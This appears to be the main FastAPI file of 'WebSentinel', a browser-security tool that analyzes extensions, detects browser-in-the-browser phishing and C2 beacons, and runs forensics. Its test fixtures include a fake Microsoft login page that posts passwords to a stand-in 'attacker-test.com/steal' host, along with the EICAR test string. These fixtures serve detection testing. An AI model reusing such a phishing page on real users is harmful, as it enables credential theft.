"""
WebSentinel — FastAPI API Gateway (All Components)
Integrates C1 (Extension Analyzer), C2 (BitB Phishing), C3 (Beacon Detector), C4 (Forensics)
Launch from project root: python -m uvicorn core.main:app --port 8000
"""
# ── Windows: switch to ProactorEventLoop so Playwright can spawn Chromium ──
import sys, os, asyncio
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

import json, tempfile, subprocess, time as _time, re as _re
from datetime import datetime
from typing import List, Optional, Set

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

from fastapi import FastAPI, File, HTTPException, Response, UploadFile, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, StreamingResponse
from pydantic import BaseModel

# ── C1 — Malicious Browser Extension Analyzer ─────────────────────────────────
from .c1.analyzer  import analyze_extension as analyze_extension_c1
from .c1.analyzer  import sandbox_extension as sandbox_extension_c1
from .c1.db        import save_result as c1_db_save, get_history as c1_db_history
from .c1.crx_utils import (
    extract_ext_id_from_url, is_webstore_url,
    fetch_crx_from_store, parse_crx_bytes, parse_crx_file,
    extract_crx_to_persistent_dir,
)

# ── C2 — Browser-in-the-Browser Phishing Detector ─────────────────────────────
from .c2.layer1_bitb       import check_bitb
from .c2.layer2_url        import check_url
from .c2.layer3_visual     import check_visual, HAS_HASHES as _L3_HAS_HASHES
from .c2.layer4_form       import check_form
from .c2.layer5_reputation import check_reputation, aclose as _reputation_aclose
from .c2.layer6_runtime    import check_runtime
from .c2.verified_domains  import is_verified

# ── C2 fusion: configurable weights + optional learned meta-classifier ─────────
_FUSION_ORDER    = ["L1", "L2", "L3", "L4", "L5", "L6"]
_DEFAULT_WEIGHTS = {"L1": 0.15, "L2": 0.25, "L3": 0.15, "L4": 0.10, "L5": 0.20, "L6": 0.15}
_fusion_model = None
_FUSION_PATH  = os.path.join(_REPO_ROOT, "models", "c2_fusion.pkl")
try:
    import pickle as _pickle
    with open(_FUSION_PATH, "rb") as _ff:
        _fusion_model = _pickle.load(_ff)
    print("[C2-fusion] Loaded learned fusion meta-classifier")
except FileNotFoundError:
    print("[C2-fusion] No c2_fusion.pkl — using weighted-sum fusion")


def _fuse_score(layer_results: list, weights: dict,
                t_susp: float = 30, t_phish: float = 60) -> float:
    """Fused risk 0–100. Uses the learned meta-classifier when present and all six
    layers ran; otherwise a configurable weighted sum over whatever layers ran.

    Decisive-signal floor: a near-certain BitB DOM (L1 *heuristic* sub-score, not the
    ML overlay) can never be washed out by the weighted sum — a confirmed
    browser-in-the-browser kit IS credential phishing on its own."""
    scores = {lr["id"]: float(lr["score"]) for lr in layer_results}
    risk = 0.0
    if _fusion_model is not None and all(k in scores for k in _FUSION_ORDER):
        try:
            import pandas as pd
            X = pd.DataFrame([[scores[k] for k in _FUSION_ORDER]], columns=_FUSION_ORDER)
            risk = float(_fusion_model.predict_proba(X)[0][1]) * 100
        except Exception:
            risk = 0.0
    if risk == 0.0:
        risk = sum(s * weights.get(lid, 0.0) for lid, s in scores.items()) * 100

    l1 = scores.get("L1")
    if l1 is not None:
        l1_row = next((lr for lr in layer_results if lr["id"] == "L1"), {})
        # heuristic sub-score when available (ML overlay can FP on out-of-distribution
        # pages, so the floor keys off the deterministic heuristic signals only)
        l1_h = float(l1_row.get("heuristic", l1))
        if l1_h >= 0.9:
            risk = max(risk, t_phish)   # definitive BitB kit DOM → PHISHING
        elif l1_h >= 0.7:
            risk = max(risk, t_susp)    # strong multi-rule hit → at least SUSPICIOUS
    return risk

# ── C3 — Browser Execution-Aware C2 Beacon Detector ───────────────────────────
from .c3.context_tagger  import c3_tagger
from .c3.interceptor     import c3_interceptor
from .c3.analyzer        import c3_analyzer
from .c3.alert_store     import c3_alert_store
from .c3.reputation_engine import set_virustotal_key as _c3_set_virustotal_key
from .c3.reputation_engine import set_abuseipdb_key as _c3_set_abuseipdb_key
from .c3.reputation_engine import set_otx_key as _c3_set_otx_key

# ── C4 — Browser Artifact Forensic Correlation Engine ─────────────────────────
from .c4 import (
    get_default_profile_path,
    get_last_result,
    get_summary as get_c4_summary,
    render_last_html,
    render_last_json,
    render_last_siem,
    report_filename,
    run_forensic_analysis,
)

# ── Shared Playwright session ──────────────────────────────────────────────────
from .playwright_session import pw_session, PROFILE_DIR as PW_PROFILE_DIR

# ══════════════════════════════════════════════════════════════════════════════
from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app):
    # Auto-start the Playwright browser when the server boots
    global _session_starting
    _session_starting = True
    pw_session.clear_callbacks()
    pw_session.add_nav_callback(_pw_nav_handler)
    pw_session.add_click_callback(_on_extension_install_click)
    pw_session.add_close_callback(_pw_tab_closed)
    asyncio.create_task(_bg_start_session())
    yield
    # Graceful shutdown
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()
    await pw_session.stop()
    await _reputation_aclose()

app = FastAPI(title="WebSentinel API", version="4.0.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── WebSocket broadcast set ────────────────────────────────────────────────────
_ws_clients: Set[WebSocket] = set()
_session_starting = False

async def _broadcast(data: dict) -> None:
    clients = list(_ws_clients)
    if not clients:
        return
    # Send to all clients concurrently so one slow/stuck client can't delay the others.
    results = await asyncio.gather(*(ws.send_json(data) for ws in clients),
                                   return_exceptions=True)
    dead = {ws for ws, r in zip(clients, results) if isinstance(r, Exception)}
    if dead:
        _ws_clients.difference_update(dead)

# ── Analyzing page shown in the Playwright browser while C1 scans an extension ─
_ANALYZING_HTML = """\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebSentinel — Analyzing Extension</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{background:#0a0e1a;color:#e2e8f0;font-family:system-ui,sans-serif;
       display:flex;align-items:center;justify-content:center;min-height:100vh}}
  .card{{text-align:center;max-width:440px;padding:48px 40px;
        background:#131929;border:1px solid #1e2d45;border-radius:16px}}
  .spinner{{width:56px;height:56px;border:4px solid #1e2d45;
           border-top-color:#3b82f6;border-radius:50%;
           animation:spin .9s linear infinite;margin:0 auto 28px}}
  @keyframes spin{{to{{transform:rotate(360deg)}}}}
  h1{{font-size:18px;font-weight:700;color:#f1f5f9;margin-bottom:10px}}
  .ext{{font-size:11px;font-family:monospace;color:#64748b;
       background:#0a0e1a;padding:4px 10px;border-radius:6px;
       display:inline-block;margin-bottom:20px}}
  p{{font-size:13px;color:#94a3b8;line-height:1.6}}
  .badge{{margin-top:28px;font-size:11px;color:#3b82f6;letter-spacing:.05em}}
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <h1>Analyzing Extension</h1>
  <div class="ext">{ext_id}</div>
  <p>WebSentinel is scanning this extension for malicious behavior.<br>
     Check the <strong>WebSentinel dashboard → C1</strong> panel for results.</p>
  <div class="badge">WEBSENTINEL &middot; C1 EXTENSION ANALYZER</div>
</div>
</body>
</html>"""

# ── In-memory state ────────────────────────────────────────────────────────────
alerts: list = []
c1_history: list = []
_pending_installs: dict = {}

_SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "settings.json")

_SETTINGS_DEFAULTS: dict = {
    "layers": {"l1": True, "l2": True, "l3": True, "l4": True, "l5": True, "l6": True},
    "whitelist": [],
    "gsb_key": "",           # C2 Layer-5 phishing check (Google Safe Browsing)
    "abuseipdb_key": "",     # C3 reputation engine
    "otx_key": "",           # C3 reputation engine
    "virustotal_key": "",    # C3 reputation engine (replaced GSB here 2026-08-29)
    "pw_home_url": "",
    "warn_threshold": 30,            # risk_score >= this -> warning banner
    "block_threshold": 60,           # risk_score >= this -> blocking interstitial
    "interstitial_enabled": True,    # show in-browser warning/block overlays
    "weights": dict(_DEFAULT_WEIGHTS),  # fusion weights (overwritten by tune_fusion)
    "verdict_suspicious": 30,        # risk_score >= this -> SUSPICIOUS
    "verdict_phishing": 60,          # risk_score >= this -> PHISHING
    "runtime_active_probe": False,   # L6: actively probe password field for keyloggers
    "phishtank_enabled": True,       # L5: query the PhishTank public feed (off = GSB only)
}

def _load_settings() -> dict:
    try:
        with open(_SETTINGS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        merged = dict(_SETTINGS_DEFAULTS)
        merged.update(data)
        return merged
    except (FileNotFoundError, json.JSONDecodeError):
        return dict(_SETTINGS_DEFAULTS)

def _save_settings(s: dict) -> None:
    try:
        with open(_SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(s, f, indent=2)
    except Exception:
        pass

settings: dict = _load_settings()
_c3_set_virustotal_key(settings.get("virustotal_key", ""))
_c3_set_abuseipdb_key(settings.get("abuseipdb_key", ""))
_c3_set_otx_key(settings.get("otx_key", ""))

# ── Request / response models ──────────────────────────────────────────────────
class AnalyzeReq(BaseModel):
    url: str
    dom: Optional[str] = None
    screenshot: Optional[str] = None
    runtime: Optional[dict] = None

class SettingsReq(BaseModel):
    layers: dict
    whitelist: List[str] = []
    gsb_key: str = ""            # C2 Layer-5 phishing check
    abuseipdb_key: str = ""      # C3 reputation engine
    otx_key: str = ""            # C3 reputation engine
    virustotal_key: str = ""     # C3 reputation engine
    pw_home_url: str = ""
    warn_threshold: int = 30
    block_threshold: int = 60
    interstitial_enabled: bool = True
    weights: Optional[dict] = None
    verdict_suspicious: int = 30
    verdict_phishing: int = 60
    runtime_active_probe: bool = False

class ExtensionAnalyzeReq(BaseModel):
    manifest: str
    source_code: Optional[str] = ""
    extension_id: Optional[str] = ""
    extension_path: Optional[str] = ""

class SandboxReq(BaseModel):
    extension_path: str

class InstallExtensionReq(BaseModel):
    url_or_id: str
    force: bool = False

class WebstoreLookupReq(BaseModel):
    url_or_id: str

class ApproveInstallReq(BaseModel):
    ext_id: str

class C3CollectReq(BaseModel):
    label: int

class ForensicReq(BaseModel):
    profile_path: Optional[str] = None
    save_outputs: bool = True

class NavigateReq(BaseModel):
    url: str


# ══════════════════════════════════════════════════════════════════════════════
#  Core / shared endpoints
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/health")
async def health():
    return {"status": "ok", "timestamp": datetime.now().isoformat(), "alerts": len(alerts)}


# ══════════════════════════════════════════════════════════════════════════════
#  C2 — BitB Phishing Detection
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/analyze")
async def analyze(req: AnalyzeReq):
    url = req.url
    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
        if url.startswith(prefix):
            return {"url": url, "verdict": "SKIP", "risk_score": 0,
                    "layers": [], "timestamp": datetime.now().isoformat()}

    for domain in settings["whitelist"]:
        if domain and domain.lower() in url.lower():
            return {"url": url, "verdict": "WHITELISTED", "risk_score": 0,
                    "layers": [], "timestamp": datetime.now().isoformat()}

    ly = settings["layers"]

    # ── Verified-domain trust gate ────────────────────────────────────────────
    # Known-good sites (Tranco allowlist, eTLD+1 match, shared hosts excluded) skip
    # the FP-prone heuristic layers but still get a reputation check, so a
    # compromised-but-listed domain can still be flagged as PHISHING.
    if is_verified(url):
        if ly.get("l5", True):
            rep = await check_reputation(url, settings["gsb_key"],
                                         settings.get("phishtank_enabled", True))
        else:
            rep = {"score": 0.0, "flagged": False, "detail": "L5 disabled"}
        if rep.get("flagged"):
            risk_score = round(min(100.0, float(rep["score"]) * 100), 1)
            result = {"url": url, "verdict": "PHISHING", "risk_score": risk_score,
                      "layers": [{"id": "L5", "name": "Reputation Check",
                                  "score": round(float(rep["score"]), 4),
                                  "detail": rep.get("detail", "")}],
                      "verified": True,
                      "timestamp": datetime.now().isoformat()}
        else:
            result = {"url": url, "verdict": "VERIFIED", "risk_score": 0.0,
                      "layers": [], "verified": True,
                      "timestamp": datetime.now().isoformat()}
        alerts.insert(0, result)
        if len(alerts) > 500:
            alerts.pop()
        return result

    layer_results = []
    weights = settings.get("weights") or _DEFAULT_WEIGHTS

    pt_enabled = settings.get("phishtank_enabled", True)
    layer_jobs = []
    if ly.get("l1", True): layer_jobs.append(("L1", "BitB Detection",    check_bitb(url, req.dom or "")))
    if ly.get("l2", True): layer_jobs.append(("L2", "URL Analysis",      check_url(url)))
    if ly.get("l3", True): layer_jobs.append(("L3", "Visual Similarity", check_visual(url, req.screenshot or "")))
    if ly.get("l4", True): layer_jobs.append(("L4", "Form Destination",  check_form(url, req.dom or "")))
    if ly.get("l5", True): layer_jobs.append(("L5", "Reputation Check",  check_reputation(url, settings["gsb_key"], pt_enabled)))
    if ly.get("l6", True): layer_jobs.append(("L6", "Runtime Behavior",  check_runtime(url, req.runtime)))

    # Run all layers concurrently: CPU layers (L1/L2/L3) run in worker threads while the
    # L5 network lookup overlaps — order is preserved from layer_jobs for the result rows.
    outcomes = await asyncio.gather(*(coro for _, _, coro in layer_jobs), return_exceptions=True)
    for (lid, lname, _), res in zip(layer_jobs, outcomes):
        if isinstance(res, Exception):
            layer_results.append({"id": lid, "name": lname, "score": 0.0, "detail": f"Error: {res}"})
        else:
            row = {"id": lid, "name": lname,
                   "score": round(float(res["score"]), 4),
                   "detail": res.get("detail", "")}
            # L1's deterministic heuristic sub-score feeds the fusion floor (§ _fuse_score)
            if lid == "L1" and "heuristic" in res:
                row["heuristic"] = res["heuristic"]
            layer_results.append(row)

    t_phish = settings.get("verdict_phishing", 60)
    t_susp  = settings.get("verdict_suspicious", 30)
    risk_score = round(min(100.0, max(0.0, _fuse_score(layer_results, weights,
                                                       t_susp, t_phish))), 1)
    verdict = "PHISHING" if risk_score >= t_phish else "SUSPICIOUS" if risk_score >= t_susp else "SAFE"

    # strip the internal heuristic sub-score from the public payload
    public_layers = [{k: v for k, v in lr.items() if k != "heuristic"} for lr in layer_results]
    result = {"url": url, "verdict": verdict, "risk_score": risk_score,
              "layers": public_layers, "timestamp": datetime.now().isoformat()}
    alerts.insert(0, result)
    if len(alerts) > 500:
        alerts.pop()
    return result


@app.get("/alerts")
async def get_alerts(limit: int = 50):
    return alerts[:limit]


@app.post("/settings")
async def save_settings(req: SettingsReq):
    settings.update({"layers": req.layers, "whitelist": req.whitelist,
                      "gsb_key": req.gsb_key, "pw_home_url": req.pw_home_url,
                      "warn_threshold": req.warn_threshold,
                      "block_threshold": req.block_threshold,
                      "interstitial_enabled": req.interstitial_enabled,
                      "verdict_suspicious": req.verdict_suspicious,
                      "verdict_phishing": req.verdict_phishing,
                      "runtime_active_probe": req.runtime_active_probe})
    if req.weights:
        settings["weights"] = req.weights
    _save_settings(settings)
    _c3_set_virustotal_key(req.virustotal_key)
    _c3_set_abuseipdb_key(req.abuseipdb_key)
    _c3_set_otx_key(req.otx_key)
    return {"status": "saved"}


@app.get("/settings")
async def get_settings():
    return settings


# ══════════════════════════════════════════════════════════════════════════════
#  C1 — Malicious Browser Extension Analyzer
# ══════════════════════════════════════════════════════════════════════════════

def _store_c1_result(result: dict, source: str, webstore_url: str = "") -> dict:
    result["timestamp"]    = datetime.now().isoformat()
    result["source"]       = source
    result["webstore_url"] = webstore_url
    c1_history.insert(0, result)
    if len(c1_history) > 50:
        c1_history.pop()
    try:
        c1_db_save(result)
    except Exception as exc:
        print(f"[C1-DB] Save failed (non-fatal): {exc}")
    return result


@app.post("/extension/analyze")
async def extension_analyze(req: ExtensionAnalyzeReq):
    result = await analyze_extension_c1(
        req.manifest, req.source_code or "",
        req.extension_id or "", req.extension_path or "",
    )
    return _store_c1_result(result, "manual")


@app.post("/extension/upload")
async def extension_upload(file: UploadFile = File(...)):
    if not file.filename or not file.filename.lower().endswith(".crx"):
        raise HTTPException(status_code=400, detail="Only .crx files are accepted.")
    crx_data = await file.read()
    if len(crx_data) < 16:
        raise HTTPException(status_code=400, detail="File too small to be a valid CRX.")
    try:
        manifest_dict, source_code, ext_id = parse_crx_bytes(crx_data)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse CRX: {exc}")

    manifest_str = json.dumps(manifest_dict)
    ext_path = ""
    try:
        import io, zipfile
        from .c1.crx_utils import _crx_to_zip_bytes
        zip_bytes = _crx_to_zip_bytes(crx_data)
        tmp_dir = tempfile.mkdtemp(prefix="c1_upload_")
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            zf.extractall(tmp_dir)
        ext_path = tmp_dir
    except Exception:
        pass

    result = await analyze_extension_c1(manifest_str, source_code, ext_id, ext_path)
    result["filename"] = file.filename
    return _store_c1_result(result, "upload")


@app.post("/extension/webstore")
async def extension_webstore(req: WebstoreLookupReq):
    raw = req.url_or_id.strip()
    ext_id = extract_ext_id_from_url(raw) or (raw.lower() if len(raw) == 32 else None)
    if not ext_id:
        raise HTTPException(status_code=400,
            detail="Provide a Chrome Web Store URL or a 32-character extension ID.")
    webstore_url = raw if is_webstore_url(raw) else \
        f"https://chromewebstore.google.com/detail/{ext_id}"
    try:
        crx_data = await fetch_crx_from_store(ext_id)
    except Exception as exc:
        raise HTTPException(status_code=502,
            detail=f"Could not download extension from Chrome Web Store: {exc}")
    try:
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse downloaded CRX: {exc}")
    ext_path = ""
    try:
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
    except Exception:
        pass
    result = await analyze_extension_c1(json.dumps(manifest_dict), source_code, ext_id, ext_path)
    result["webstore_url"] = webstore_url
    return _store_c1_result(result, "webstore", webstore_url)


@app.post("/extension/sandbox")
async def extension_sandbox(req: SandboxReq):
    return await sandbox_extension_c1(req.extension_path)


@app.get("/extension/history")
async def extension_history(limit: int = 20):
    try:
        return await asyncio.to_thread(c1_db_history, limit)
    except Exception:
        return c1_history[:limit]


@app.post("/session/install_extension")
async def session_install_extension(req: InstallExtensionReq):
    raw = req.url_or_id.strip()
    ext_id = extract_ext_id_from_url(raw) or (raw.lower() if len(raw) == 32 else None)
    if not ext_id:
        raise HTTPException(status_code=400,
            detail="Provide a Chrome Web Store URL or a 32-character extension ID.")
    try:
        crx_data = await fetch_crx_from_store(ext_id)
    except Exception as exc:
        raise HTTPException(status_code=502,
            detail=f"Could not download from Chrome Web Store: {exc}")
    try:
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse CRX: {exc}")

    c1_result = await analyze_extension_c1(json.dumps(manifest_dict), source_code, ext_id)
    _store_c1_result(c1_result, "webstore_install")

    if c1_result["verdict"] == "MALICIOUS" and not req.force:
        return {"status": "blocked",
                "reason": "C1 flagged this extension as MALICIOUS — installation prevented.",
                "extension_id": ext_id, "c1_result": c1_result}

    try:
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Extraction failed: {exc}")

    if pw_session.is_running:
        pw_session.register_extension(ext_path)
        await _broadcast({"type": "c1_extension_installed",
                           "extension_id": ext_id,
                           "extension_path": ext_path,
                           "c1_result": c1_result})
        return {"status": "installed", "extension_id": ext_id,
                "extension_path": ext_path, "c1_result": c1_result,
                "note": "Extension registered — will be active on next session start."}
    return {"status": "ready",
            "message": "Extension extracted. Start the browser session to load it.",
            "extension_id": ext_id, "extension_path": ext_path, "c1_result": c1_result}


@app.get("/session/extensions")
async def get_session_extensions():
    return {"extensions": pw_session.loaded_extensions,
            "count": len(pw_session.loaded_extensions)}


async def _on_extension_install_click(ext_id: str, webstore_url: str) -> None:
    if not ext_id:
        return
    print(f"[C1] 'Add to Chrome' clicked: {ext_id}")
    await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                      "url": webstore_url, "state": "analyzing"})
    try:
        crx_data = await fetch_crx_from_store(ext_id)
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
        manifest_str = json.dumps(manifest_dict)

        static_result = await analyze_extension_c1(manifest_str, source_code, ext_id)
        static_score_pct = static_result["static"]["score"] * 100

        if static_score_pct >= 50.0:
            await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                               "url": webstore_url, "state": "sandbox_running",
                               "static_score": round(static_score_pct, 1)})
            c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                    extension_path=ext_path)
        else:
            c1_result = static_result

        _store_c1_result(c1_result, "webstore_intercept", webstore_url)
        _pending_installs[ext_id] = {"c1_result": c1_result, "ext_path": ext_path,
                                      "webstore_url": webstore_url}

        state = {"SAFE": "safe", "SUSPICIOUS": "suspicious",
                 "MALICIOUS": "malicious"}.get(c1_result["verdict"], "suspicious")
        print(f"[C1] {ext_id} -> {c1_result['verdict']} (score={c1_result['score']:.3f})")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": state, "result": c1_result})
    except Exception as exc:
        print(f"[C1] Analysis FAILED for {ext_id}: {exc}")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": "error", "error": str(exc)})


@app.post("/session/approve_install")
async def approve_install(req: ApproveInstallReq):
    pending = _pending_installs.get(req.ext_id)
    if not pending:
        raise HTTPException(status_code=404,
            detail="No pending install found for this extension ID.")
    verdict = pending["c1_result"].get("verdict", "SUSPICIOUS")
    if verdict != "SAFE":
        raise HTTPException(status_code=403,
            detail=f"Cannot approve — extension verdict is {verdict}.")
    ext_path     = pending["ext_path"]
    webstore_url = pending.get("webstore_url", "")
    del _pending_installs[req.ext_id]
    # Register the extension in the launch list without restarting the session.
    # Chrome requires --load-extension at startup; hot-loading is not supported
    # by this Chromium build. The extension will be active on the next session start.
    pw_session.register_extension(ext_path)
    await _broadcast({"type": "c1_install_approved", "ext_id": req.ext_id,
                       "extension_path": ext_path, "webstore_url": webstore_url})
    return {"status": "approved", "ext_id": req.ext_id,
            "note": "Extension registered — will be active on next session start."}


@app.post("/session/block_install")
async def block_install(req: ApproveInstallReq):
    _pending_installs.pop(req.ext_id, None)
    await _broadcast({"type": "c1_install_blocked", "ext_id": req.ext_id})
    return {"status": "blocked", "ext_id": req.ext_id}


def _run_test_component(label: str, script: str) -> dict:
    """Run a test script as a subprocess and parse unittest -v output."""
    start = _time.time()
    try:
        proc = subprocess.run(
            [sys.executable, script, "-v"],
            capture_output=True, text=True, timeout=120,
            cwd=_REPO_ROOT, encoding="utf-8", errors="replace"
        )
        output = proc.stderr + "\n" + proc.stdout  # unittest writes to stderr
        elapsed = _time.time() - start

        tests = []
        # unittest -v format: "test_name (module.ClassName) ... ok"
        # Python 3.11+ adds the test method in the class name too
        for line in output.splitlines():
            m = _re.match(r"^(test\w+)\s+\(([^)]+)\)\s+\.\.\.\s+(ok|FAIL|ERROR|skipped.*)", line)
            if m:
                tname, tclass, tstatus = m.group(1), m.group(2).split(".")[-1], m.group(3)
                tests.append({"name": tname, "cls": tclass,
                               "status": "pass" if tstatus == "ok" else "skip" if tstatus.startswith("skipped") else "fail"})
            else:
                # C4 script format: "  PASS  description" or "  FAIL  description"
                m2 = _re.match(r"^\s+(PASS|FAIL)\s+(.+)", line)
                if m2:
                    tests.append({"name": m2.group(2).strip()[:80], "cls": "",
                                   "status": "pass" if m2.group(1) == "PASS" else "fail"})

        # Extract failure/error detail blocks
        fail_blocks: dict = {}
        current_key = None
        for line in output.splitlines():
            if line.startswith("FAIL: ") or line.startswith("ERROR: "):
                current_key = line.split(": ", 1)[1].split(" ")[0]
                fail_blocks[current_key] = []
            elif current_key and line.startswith("-" * 10):
                continue
            elif current_key:
                if line.startswith("=" * 10):
                    current_key = None
                else:
                    fail_blocks[current_key].append(line)

        # Attach error messages to tests
        for t in tests:
            if t["status"] == "fail":
                key = t["name"]
                if key in fail_blocks:
                    t["message"] = "\n".join(fail_blocks[key]).strip()

        passed = sum(1 for t in tests if t["status"] == "pass")
        failed = sum(1 for t in tests if t["status"] == "fail")

        # Fallback: if no tests parsed, check return code
        if not tests:
            # Try to parse summary line: "Ran X tests in Y.Ys"
            m_ran = _re.search(r"Ran (\d+) test", output)
            total = int(m_ran.group(1)) if m_ran else 0
            ok_m = _re.search(r"OK", output)
            passed = total if ok_m else 0
            failed = total - passed

        return {
            "label": label,
            "passed": passed,
            "failed": failed,
            "total": len(tests) if tests else (passed + failed),
            "duration": round(elapsed, 2),
            "tests": tests,
            "stdout": output[-3000:],  # last 3000 chars for debugging
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"label": label, "passed": 0, "failed": 0, "total": 0,
                "duration": 120, "tests": [], "stdout": "Timeout after 120s", "returncode": -1}
    except Exception as exc:
        return {"label": label, "passed": 0, "failed": 0, "total": 0,
                "duration": 0, "tests": [], "stdout": str(exc), "returncode": -1}


@app.post("/dev/run_tests")
async def run_tests(component: str = "all"):
    """Run unit test suites and return structured results."""
    components_map = {
        "c1": ("C1 — Extension Analyzer",   os.path.join(_REPO_ROOT, "test", "C1", "test_c1_units.py")),
        "c2": ("C2 — Phishing Detection",   os.path.join(_REPO_ROOT, "test", "C2", "test_c2_layers.py")),
        "c3": ("C3 — Beacon Detector",      os.path.join(_REPO_ROOT, "test", "C3", "test_c3_units.py")),
        "c4": ("C4 — Forensic Correlation", os.path.join(_REPO_ROOT, "test", "C4", "test_units.py")),
    }
    targets = list(components_map.items()) if component == "all" else \
              [(component, components_map[component])] if component in components_map else []

    loop = asyncio.get_event_loop()
    results = []
    for cid, (label, script) in targets:
        r = await loop.run_in_executor(None, _run_test_component, label, script)
        r["id"] = cid
        results.append(r)

    total_passed = sum(r["passed"] for r in results)
    total_failed = sum(r["failed"] for r in results)
    total_duration = sum(r["duration"] for r in results)
    return {
        "components": results,
        "total_passed": total_passed,
        "total_failed": total_failed,
        "total_duration": round(total_duration, 2),
    }


_TEST_PAGES: dict = {
    "c2-phish": """<!DOCTYPE html><html><head><title>Secure Login - Microsoft</title></head><body>
<iframe style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;border:none;"
        src="https://login.evil-test.com/oauth"></iframe>
<form action="https://attacker-test.com/steal" method="POST">
  <input type="password" name="pass" placeholder="Password"/>
  <input type="hidden" name="token" value="abc123"/>
</form>
<script src="https://cdn.evil-test.com/tracker.js"></script>
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
            background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 32px rgba(0,0,0,.3);
            font-family:Segoe UI,sans-serif;text-align:center;z-index:99998">
  <h2 style="color:#0078d4">Sign in to Microsoft</h2>
  <input type="email" placeholder="Email" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
  <input type="password" placeholder="Password" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
  <button style="background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer">Next</button>
  <p style="font-size:11px;color:#888;margin-top:12px">WebSentinel C2 Phishing Test Page</p>
</div>
</body></html>""",

    "c2-clean": """<!DOCTYPE html><html><head><title>My Blog</title></head><body>
<h1>Welcome to My Blog</h1><p>This is a perfectly safe page with no phishing indicators.</p>
<article><h2>Article Title</h2><p>Some content here.</p></article>
<footer><p>Copyright 2024 My Blog</p></footer>
</body></html>""",

    "c3-beacon": """<!DOCTYPE html><html><head><title>Beacon Test</title></head><body>
<h2>C3 Beacon Simulation Test</h2>
<p>This page simulates C2 beacon behavior for testing purposes.</p>
<script>
// Simulate regular beacon requests (for test visualization only)
let seq = 0;
function sendBeacon() {
  console.log('[C3-TEST] Beacon seq=' + seq++);
}
setInterval(sendBeacon, 5000);
</script>
</body></html>""",
}

# Realistic C2 test pages live on disk in test/C2/pages/ (built from the real mrd0x
# BitB kits + hand-crafted scenario pages — see test/C2/build_pages.py). Load them
# into _TEST_PAGES so /dev/test-page/<name> can serve them to the live browser.
_TEST_PAGES_DIR = os.path.join(_REPO_ROOT, "test", "C2", "pages")
if os.path.isdir(_TEST_PAGES_DIR):
    for _fname in os.listdir(_TEST_PAGES_DIR):
        if _fname.endswith(".html"):
            _key = "c2-" + _fname[:-5].replace("_", "-")
            try:
                with open(os.path.join(_TEST_PAGES_DIR, _fname), encoding="utf-8") as _fh:
                    _TEST_PAGES[_key] = _fh.read()
            except OSError:
                pass

@app.get("/dev/test-page/{name}")
async def serve_test_page(name: str):
    html = _TEST_PAGES.get(name)
    if not html:
        return HTMLResponse("<html><body>Test page not found</body></html>", status_code=404)
    return HTMLResponse(html)


# The official EICAR anti-malware test string — a 68-byte ASCII signature every
# AV engine on earth recognizes as "found: EICAR-Test-File". It contains no
# executable logic and is completely harmless; it exists specifically so
# security tools can be tested without using real malware. See eicar.org.
# Served locally (rather than fetched from eicar.org's own secure.eicar.org
# host) because that host's payload endpoint resets the connection from this
# environment's network path before the response completes — likely network-
# level content inspection intercepting the known signature in transit. The
# bytes here are byte-for-byte identical to the official file either way.
EICAR_TEST_STRING = rb'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


@app.get("/dev/test-file/eicar")
async def serve_eicar_testfile():
    return Response(
        EICAR_TEST_STRING,
        media_type="application/octet-stream",
        headers={"Content-Disposition": 'attachment; filename="eicar.com"'},
    )


# ── Inline test cases ─────────────────────────────────────────────────────────

async def _tc_c1_benign_manifest():
    from .c1.features import extract_manifest_features
    manifest = {"name": "Simple", "version": "1.0", "manifest_version": 3, "permissions": ["storage"]}
    feats = extract_manifest_features(manifest, "")
    assert feats["has_webRequest"] == 0.0, "has_webRequest should be 0"
    assert feats["has_all_urls"] == 0.0, "has_all_urls should be 0"
    assert feats["total_permission_count"] == 1.0, "total_permission_count should be 1"
